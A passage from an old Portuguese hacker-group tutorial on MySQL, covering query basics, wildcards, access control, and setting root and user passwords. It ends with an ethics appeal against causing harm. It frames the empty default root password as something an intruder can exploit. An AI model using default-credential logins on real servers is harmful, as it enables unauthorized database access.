+mysql aceita formato-livre de entrada de dados, ele coleciona ou junta
+as linhas entradas mas nao as executa ateh que ele encontre o ponto e
+virgula.Abaixo segue um exemplo disso:
+
+mysql> select
+    -> user()
+    -> ,
+    -> current_date;
++---------------------+--------------+
+| user()              | current_date |
++---------------------+--------------+
+| anonymous@localhost | 2000-05-24   |
++---------------------+--------------+
+1 row in set (0.00 sec)
+
+Neste exemplo acima, podemos notar que o prompt mudou de mysql> para ->
+apos voce digitar enter na primeira linha.Isto eh porque mysql indica
+que ele nao tem visto uma declaracao completa e estah esperando pelo
+resto.
+
+Digamos que voce estah processando varias entradas, e no meio do caminho
+voce decide que nao quer processar algo que jah foi digitado, voce pode
+cancelar digitando \c:
+
+mysql> select
+    -> user()
+    -> \c
+mysql>
+
+Acima voce nota que ele nao processou nada, pois nao deu o tempo nem nada
+como resposta.
+
+A tabela abaixo nos mostra o significado de alguns prompts usado pelo mysql:
+
+mysql> Esse prompt indica que ele estah esperando por um novo comando.
+->     Esse prompt indica que ele estah esperando pela proxima linha de
+       um comando com multiplas linhas.
+'>     Espera pela proxima linha, coletando uma string que inicia com um
+       apostrofo(').
+">     Espera pela proxima linha, coletando uma string que inicia com uma
+       aspas(").
+
+Os prompts '> e "> geralmente ocorrem durante coleta de strings.Em MySQL,
+voce pode escrever strings rodeadas por apostofros (') ou aspas("), por
+exemplo 'hacker' ou "fucador".Quando voce comeca a declaracao numa linha,
+mas necessita de varias, MySQL mostra que voce entrou um string comecando
+com ' ou ".Os prompts servem justamente para alertar quanto a isso.
+Vejamos um exemplo:
+
+mysql> SELECT * FROM my_table WHERE name = 'Jose AND idade < 30;
+    '>
+
+Voce pode notar acima isso.Verah tambem que para sair desse prompt, voce
+terah que digitar um ', nem mesmo \c sai disso.Vode poderia tambem para
+fugir, digitar na mesma linha '\c.
+
+
+4.3 Exemplos de Queries Comuns
+-------------------------------
+
+Nesse item, veremos alguns dos exemplos basicos de queries.Nada complexo.
+Suponhamos que voce queira colocar no banco de dados uma lista com precos
+de CDs(ou mesmo baixar os precos de alguns. :).), voce poderia criar algo
+assim:
+
+* Primeiro criamos a database, se jah tiver, passe para o proximo item:
+
+mysql> CREATE DATABASE precos;
+Query OK, 1 row affected (0.06 sec)
+
+* Depois a selecionamos:
+
+mysql> use precos
+Database changed
+
+* Em seguida pedimos para ele nos mostrar as tabelas contidas nesse
+  database:
+
+mysql> show tables;
+Empty set (0.04 sec)
+
+* Como vimos, no meu exemplo, ela estah vazia.Entao vamos criar a tabela:
+
+mysql> CREATE TABLE preco(
+    -> cds INT(2) UNSIGNED ZEROFILL DEFAULT '00' NOT NULL,
+    -> preco DOUBLE(16,2)             DEFAULT '0.00' NOT NULL,
+    -> PRIMARY KEY(cds,preco));
+Query OK, 0 rows affected (0.33 sec)
+
+Na primeira linha ordenamos a criacao da tabela, na segunda definimos os
+dados da primeira coluna, na terceira, os dados da segunda coluna, primary
+key ordena quais colunas devem ser definidas como nao nulas.
+
+mysql> INSERT INTO preco VALUES
+    -> (1,20.30), (2, 40.56), (3, 75.80);
+
+O que fizemos acima foi colocar os valores na tabela.Agora vamos ver
+como ficou nossa tabela:
+
+mysql> SELECT * FROM preco;
++-----+-------+
+| cds | preco |
++-----+-------+
+|  01 | 20.30 |
+|  02 | 40.56 |
+|  03 | 75.80 |
++-----+-------+
+3 rows in set (0.01 sec)
+
+Aih estah nossa tabela construida.
+
+* Vejamos agora como ficou as tabelas no nosso database:
+
+mysql> show tables;
++------------------+
+| Tables in precos |
++------------------+
+| preco            |
++------------------+
+1 row in set (0.00 sec)
+
+Isso mesmo.O esquema acima eh simples, mas vamos melhorar ainda mais,
+vamos colocar nomes de bandas para melhorar nosso esquema.Vamos criar uma
+nova tabela:
+
+mysql> create table preco2(
+    -> codigo INT(3) UNSIGNED ZEROFILL DEFAULT '000' NOT NULL,
+    -> banda CHAR(15)                 DEFAULT ''     NOT NULL,
+    -> preco DOUBLE(16,2)             DEFAULT '0.00' NOT NULL,
+    -> copias_vendidas INT(4) UNSIGNED ZEROFILL DEFAULT '0000' NOT NULL,
+    -> PRIMARY KEY(codigo,banda,preco));
+Query OK, 0 rows affected (0.01 sec)
+
+Tudo ok, vamos colocar os dados:
+
+mysql> INSERT INTO preco2  VALUES
+    -> (1,'capital inicial',2.50,567),(2,'banda zero',3.75,934),
+    -> (3,'plebe rube',1.42,789),(4,'legiao urbana',4.78,234),
+    -> (5,'nenhum de nos',3.46,123);
+Query OK, 5 rows affected (0.01 sec)
+Records: 5  Duplicates: 0  Warnings: 0
+
+Agora vamos ver como ficou nossa tabela, em seguida nosso banco de dados:
+
+mysql> SELECT * FROM preco2;
++--------+-----------------+-------+-----------------+
+| codigo | banda           | preco | copias_vendidas |
++--------+-----------------+-------+-----------------+
+|    001 | capital inicial |  2.50 |            0567 |
+|    002 | banda zero      |  3.75 |            0934 |
+|    003 | plebe rube      |  1.42 |            0789 |
+|    004 | legiao urbana   |  4.78 |            0234 |
+|    005 | nenhum de nos   |  3.46 |            0123 |
++--------+-----------------+-------+-----------------+
+5 rows in set (0.01 sec)
+
+mysql> show tables;
++------------------+
+| Tables in precos |
++------------------+
+| preco            |
+| preco2           |
++------------------+
+2 rows in set (0.03 sec)
+
+Tudo ok.Como podemos ver, o query envolvendo criacao de tabela eh bastante
+simples, com um pouco de pratica, pode-se ir bem mais alem.A ordenacao das
+colunas pode ser manipulada perfeitamente.Voce pode testar comandos como
+os que seguem abaixo e notar as diferencas:
+
+mysql> SELECT banda FROM preco2;
+mysql> SELECT preco FROM preco2;
+
+mysql> SELECT banda,preco FROM preco2;
++-----------------+-------+
+| banda           | preco |
++-----------------+-------+
+| capital inicial |  2.50 |
+| banda zero      |  3.75 |
+| plebe rube      |  1.42 |
+| legiao urbana   |  4.78 |
+| nenhum de nos   |  3.46 |
++-----------------+-------+
+5 rows in set (0.01 sec)
+
+Enfim, voce pode manipular o database para dizer o que voce desejar.
+Exemplos: 
+
+* para mostrar maior preco:
+
+mysql> select max(preco) as preco from preco2;
+
+* para mostrar menor preco:
+
+mysql> select min(preco) as preco from preco2;
+
+* para ver qual banda possui menor preco:
+
+mysql> select banda,preco from preco2 where preco=1.42;
++------------+-------+
+| banda      | preco |
++------------+-------+
+| plebe rube |  1.42 |
++------------+-------+
+1 row in set (0.07 sec)
+
+OBS: ele nao pega diretamente, entao nesse caso, a interacao nao ocorre,
+     o melhor modo eh voce pegar o menor preco e depois com o dado
+     obtido, mandar ele mostrar depois qual eh a banda, como no exemplo
+     acima.
+
+* para ver qual banda vendeu mais unidades, seguem os passos abaixo:
+
+mysql> select max(copias_vendidas) as mais_vendido from preco2;
++--------------+
+| mais_vendido |
++--------------+
+|          934 |
++--------------+
+1 row in set (0.00 sec)
+
+mysql> select banda,copias_vendidas as vendeu
+    -> from preco2 where copias_vendidas = 934;
++------------+--------+
+| banda      | vendeu |
++------------+--------+
+| banda zero |   0934 |
++------------+--------+
+1 row in set (0.00 sec)
+
+Outro exemplo comum eh o uso de wildcards...Vejamos um esquema para isso:
+
+mysql> select * from preco2 where banda LIKE '%zero'\g
++--------+------------+-------+-----------------+
+| codigo | banda      | preco | copias_vendidas |
++--------+------------+-------+-----------------+
+|    002 | banda zero |  3.75 |            0934 |
++--------+------------+-------+-----------------+
+1 row in set (0.01 sec)
+
+mysql>
+
+No exemplo acima, se tivesse mais de uma banda terminando com a string
+"zero", certamente apareceria.Outro possivel esquema:
+
+mysql> select * from preco2 where codigo LIKE '__3'\g
++--------+------------+-------+-----------------+
+| codigo | banda      | preco | copias_vendidas |
++--------+------------+-------+-----------------+
+|    003 | plebe rube |  1.42 |            0789 |
++--------+------------+-------+-----------------+
+1 row in set (0.01 sec)
+
+No exemplo acima, ele procura por dois caracteres antes do caracter "3".
+
+Entao amigo, o caracter wildcard '_' serve para substituir apenas 1 valor,
+se voce colar 2(__), ele substituirah dois, se botar 3 (___), substituirah
+tres e assim por diante.O caracter wildcard '%' nao possui uma conta limite,
+se voce declara ele antes de uma string como em "%zero" tudo que eh fila 
+contendo a string 'zero' no final em uma coluna, serah mostrada.Se voce
+colocar "zero%", ocorrerah o inverso, tudo que eh fila de uma coluna que
+tiver uma string comecando com a palavra ou string 'zero' serah mostrada.
+E se voce colocar "%zero%", ele irah procurar pela palavra 'zero' no meio
+de uma string de uma fila de uma coluna.No mundo Unix nos podemos usar
+dois wildcards para efeito de comparacao.O "?" eh igual a este "_" e
+o "*" eh igual a este "%".
+
+Para esquemas simples nao parece ter muito segredo.Pratique bem a
+interacao das intrucoes e tudo serah bem mais facil, sem pratica, estudo
+e dedicacao, tudo na 'arte fucadora' se torna mais dificil.
+
+-------------------------
+5 - ADMINISTRACAO BASICA |
+-------------------------
+
+Como descrito no inicio do item acima, sao varias as possiveis operacoes
+de administracao basica.Irei descrever mais algumas delas neste item.
+
+5.1 - Controle de Acesso
+-------------------------
+
+Quando voce tenta se conectar ao servidor do MySQL, o servidor aceita ou
+rejeita sua conexao baseado em sua identidade ou mesmo se voce digitou o
+passwd certo ou errado.Abaixo seguem alguns possiveis esquemas para 
+conexao:
+
+* O host pode ser um IP ou um hostname, ambas as operacao sao suportadas.
+
+* O passwd pode ser uma senha em branco(sem senha).Nesse caso nao se pede
+  senha, igual a conexao como anonymous.
+
+* MySQL nao armazena os passwd em uma planilha de texto.Isso eh para que
+  ninguem veja.Mas no entanto eh armazenado na user table.
+
+* Quando o servidor le na tabela de hosts "confiaveis", ele procura pelo
+  host que voce estah usando.Se for permitido, entao ele procura o MySQL
+  username,   se for permitido tambem, ele ve se existe a necessidade de 
+  senha, se   existe, logo apos a conexao eh estabelecida.Um invasor pode 
+  facilitar as coisas nesse ponto.
+
+5.2 - Setando Privilegios
+--------------------------
+
+Eu falei lah em cima do uso de chmod.O por que deu ter dito aquilo fica
+subentendido.:).Aqui iremos ver como setar privilegios.Veremos o que um
+administrador de rede faz para tentar barrar nosso acesso ao banco de
+dados.Veremos aqui alguns perigos para o admin que usa a versao default
+sem alterar a mesma e as possiveis vantagens que um fucador pode tirar.
+Assim que o MySQL eh instalado e o servidor inicializado, alguns
+privilegios sao setados por default, e abaixo segue algumas configuracoes:
+
+* O usuario MySQL root eh criado com status de superusuario que pode fazer
+  tudo.Conexoes podem ser feitas do host local.O root passwd de inicio eh
+  vazio(sem senha), entao qualquer um que conectar como root sem um passwd
+  poderah fazer o que quiser.Se o host continua default, execute o seguinte
+  aih sem ser root no linux:
+
+  [localhost]$ id
+  uid=1000(nashleon) gid=100(users) groups=100(users)
+  [localhost]$ ./mysql -u root
+  Welcome to the MySQL monitor.  Commands end with ; or \g.
+  Your MySQL connection id is 1 to server version: 3.22.32
+
+  Type 'help' for help.
+
+  mysql>  status
+  --------------
+  ./mysql  Ver 9.38 Distrib 3.22.32, for pc-linux-gnu (i686)
+
+  Connection id:          2
+  Current database:
+  Current user:           root@localhost
+  Server version          3.22.32
+  Protocol version        10
+  Connection              Localhost via UNIX socket
+  UNIX socket             /tmp/mysql.sock
+  Uptime:                 1 min 42 sec
+
+  Threads: 1  Questions: 7  Slow queries: 0  Opens: 6  Flush tables: 1
+  Open tables: 2
+  --------------
+
+Como voce pode ver, por default, jah comecou mal.Mas ele avisa as coisas,
+para evitar isso.Para um fucador, a configuracao default eh otima!Vejamos
+como setar um passwd para o root:
+
+[localhost]$ ./mysql -u root mysql
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 14 to server version: 3.22.32
+
+Type 'help' for help.
+
+mysql>UPDATE user SET Password=PASSWORD('aqui_voce_bota_a_senha')
+    -> WHERE user='root';
+Query OK, 0 rows affected (0.01 sec)
+Rows matched: 2  Changed: 0  Warnings: 0
+
+mysql> FLUSH PRIVILEGES;
+Query OK, 0 rows affected (0.01 sec)
+
+mysql>
+
+Pronto.Veja que a linha correspondente ao usuario eh a segunda, onde vemos
+"WHERE user='root'"; Aqui, o verdadeiro admin comeca a ter problemas.Nunca
+se deve colocar um daemon sem conhecimentos basicos da seguranca do mesmo.
+Um outro modo para a mesma operacao segue abaixo:
+
+[localhost]$ ./mysql -u root mysql
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 18 to server version: 3.22.32
+
+Type 'help' for help.
+
+mysql> SET PASSWORD FOR root=PASSWORD('nova_senha');
+Query OK, 0 rows affected (0.08 sec)
+
+mysql>exit
+Bye
+
+O esquema acima eh bastante pratico e muito eficiente.Abaixo segue 
+continuando com os topicos;
+
+* Eh criado um usuario anonymous, sem senha.Mas assim que voce seta o
+  passwd para o root, todo e qualquer usuario que tentar se conectar ao
+  server, anonymous tambem, terah que digitar o tal passwd.Para setar
+  passwd individuais ou mesmo criar usuarios super privilegiados, os
+  esquemas abaixo podem ser uteis:
+
+  [localhost]$ ./mysql -u root mysql -p
+  Enter password:
+  Reading table information for completion of table and column names
+  You can turn off this feature to get a quicker startup with -A
+
+  Welcome to the MySQL monitor.  Commands end with ; or \g.
+  Your MySQL connection id is 27 to server version: 3.22.32
+
+  Type 'help' for help.
+
+  mysql> GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP
+      -> on *.*
+      -> to nashleon@localhost
+      -> IDENTIFIED BY 'nashleon';
+  Query OK, 0 rows affected (0.10 sec)
+
+Depois disso voce pode se logar no sistema como usuario nashleon e senha
+nashleon.Existem diversos outros esquemas para se executar operacoes
+parecidas como esta.Para setar passwd para um usuario qualquer, basta
+fazermos:
+
+[localhost]$ bin/mysql -u nashleon -p mysql
+Enter password:
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 8 to server version: 3.22.32
+
+Type 'help' for help.
+
+mysql> set password for nashleon@localhost = PASSWORD('coracao');
+Query OK, 0 rows affected (0.01 sec)
+
+A senha agora serah igual a coracao.
+
+
+---------------
+6 - TERMINANDO |
+---------------
+
+Como voce pode ver amigo, ateh mesmo os banco de dados podem ser uteis
+para um fucador.Soh para efeito de ilustracao, muitos programas trabalham
+em cima deles, seja pagamentos de contas, seja instalacao e venda de
+produtos, enfim, os bancos de dados fazem parte do cotidiano das grandes e
+medias empresas.As possibilidades de implementacao de tecnicas fucadoras
+em cima dos mesmos eh ilimitada.Um administrador responsavel sabe disso e
+trata de dificultar ao maximo as "brechas" que esses programas possuem.
+Existe muito mais coisas e furos no MySQL, sua implementacao em WEB SERVERS
+torna possivel muitas coisas, estude, vah fundo e descubra seus proprios
+esquemas.A instalacao Padrao do MySQL eh um convite para se tornar root
+no sistema.
+
+6.1 - Links e Referencias
+--------------------------
+
+Acho que um bom documento sobre MySQL eh o manual.html que vem junto com
+a distribuicao,foi nele que eu me baseei, de modo que recomendo mesmo a
+leitura, ele eh bem mais completo do que este simples tutorial.Voce pode
+obte-lo em:
+
+http://www.mysql.com/
+
+Outros tutoriais de SQL podem ser obtidos em:
+
+http://tutorial.virtualave.net/ -> Procure em Apostilas de Informatica.
+
+Home pages atuais do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br
+
+Outros Links muito interessantes:
+
+http://www.bufferoverflow.org/
+http://www.hacker.com.br/
+http://www.taldowin.com.br/
+http://www.securenet.com.br/
+
+
+6.2 - Consideracoes Finais
+---------------------------
+
+Aih estah amigo.Os banco de dados existem para o mundo fucador e devemos
+usa-los para descobrir suas brechas.Mas a medida que o tempo passa, as
+coisas vao mudando.Nao faca bobagens e nao prejudique pessoas com o
+conhecimento que voce possui ou venha a possuir.Nao existe limite para o
+conhecimento de modo que prejudicar alguem eh querer dar fim a esta
+incessante busca de aprendizado e consequentemente aprisionar teu cerebro.
+Um cara que costuma fazer bobagens se queima frente todo mundo, ser um
+cracker nao eh ser o bom, longe disso, ser um cracker ou eh ser burro, ou
+imaturo.O final da linha para um cracker eh o mesmo de todo e qualquer
+criminoso, cadeia ou morte.Muitos hackers foram presos e injusticados por
+conta desse sistema, que sempre escraviza e procura reprimir nossa
+metalidade 'critica'.Garanto com toda certeza para voce amigo NewBie, que
+os melhores hackers nao sao os que mudam home pages ou fazem DDoS,ou mesmo
+desviam dinheiro de um banco.Longe disso!!Os melhores sempre fazem algo 
+construtivo, e provavelmente sao os menos conhecidos.Nao se queime no 
+'underground', nao faca bobagens, siga a etica, e procure ver as coisas 
+boas que essa etica pode te trazer.Eu escrevo todas essas linhas tecnicas, 
+mas prezo pela etica.Amanha eu posso estar sendo injusticado(preso) ou sei
+lah o que,mas se alguem leu isso tudo e de alguma forma acreditou mesmo no 
+que escrevi, entao vai ter valido a pena.Nessa vida, onde poucas coisas 
+realmente valem a pena, viver a etica hacker, eu acho que compensa.
+Um abraco.
+
+Agradeco mais uma vez ao pessoal do Unsekurity Team, psych, module,e-brain,
+t[rex], Cs0, raynox, xf86config, SegFault, gid, Cdma, Matt_Salermo, Bl4ck
+Ox1g3n, xcarioca, Jans, t0x[1]c, OLHA[on], alex-linux, Dinamite_, arse,
+antilove, psychodeath, zip, thunderoffire, ocorvo e aos demais que esqueci
+o nick..:)..Tb aos outros grupos que mexe com 'hacking' e da seguranca que
+respeitam aqueles que seguem a etica.
+
+
+						Nash Leon.
+
+----------------------------------EOF------------------------------------
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
